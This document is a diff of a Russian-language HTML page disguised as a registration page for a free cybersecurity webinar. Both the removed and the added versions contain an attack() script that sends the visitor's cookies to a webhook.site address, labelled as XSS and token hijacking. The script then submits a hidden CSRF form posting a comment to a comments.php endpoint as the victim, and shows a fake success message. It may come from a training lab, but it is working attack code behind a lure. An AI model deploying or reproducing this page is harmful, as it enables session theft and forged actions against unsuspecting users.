@@ -42,34 +42,6 @@
       display: none;
     }
   </style>
-  <script>
-    function attack() {
-      // 1. Сначала отправим cookie (XSS+Token Hijack)
-   
-  fetch("https://webhook.site/https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(document.cookie));
-
-
-      // 2. Затем создаём CSRF-форму
-      const form = document.createElement("form");
-      form.action = "https://kazcyber.zapto.org/comments.php";
-      form.method = "POST";
-      form.target = "hiddenFrame";
-
-      // 3. Пишем комментарий от имени пользователя
-      const input = document.createElement("input");
-      input.type = "hidden";
-      input.name = "comment";
-      input.value = "CSRF-комментарий от имени жертвы";
-      form.appendChild(input);
-
-      // 4. Добавляем форму и отправляем
-      document.body.appendChild(form);
-      form.submit();
-
-      // 5. Показываем подтверждение
-      document.querySelector(".confirmation").style.display = "block";
-    }
-  </script>
 </head>
 <body>
   <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
@@ -79,6 +51,32 @@
 
   <div class="confirmation">✅ Вы успешно зарегистрированы!</div>
   <iframe name="hiddenFrame"></iframe>
+
+  <script>
+    function attack() {
+      // 1. XSS — отправка cookie злоумышленнику
+      fetch("https://webhook.site/https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(document.cookie));
+
+      // 2. CSRF-атака — отправка формы от имени жертвы
+      const form = document.createElement("form");
+      form.action = "https://kazcyber.zapto.org/comments.php";
+      form.method = "POST";
+      form.target = "hiddenFrame";
+
+      const input = document.createElement("input");
+      input.type = "hidden";
+      input.name = "comment";
+      input.value = "💀 CSRF-комментарий от имени жертвы 💀";
+      form.appendChild(input);
+
+      document.body.appendChild(form);
+      form.submit();
+
+      // 3. Показываем сообщение
+      document.querySelector(".confirmation").style.display = "block";
+    }
+  </script>
 </body>
 </html>
+
 
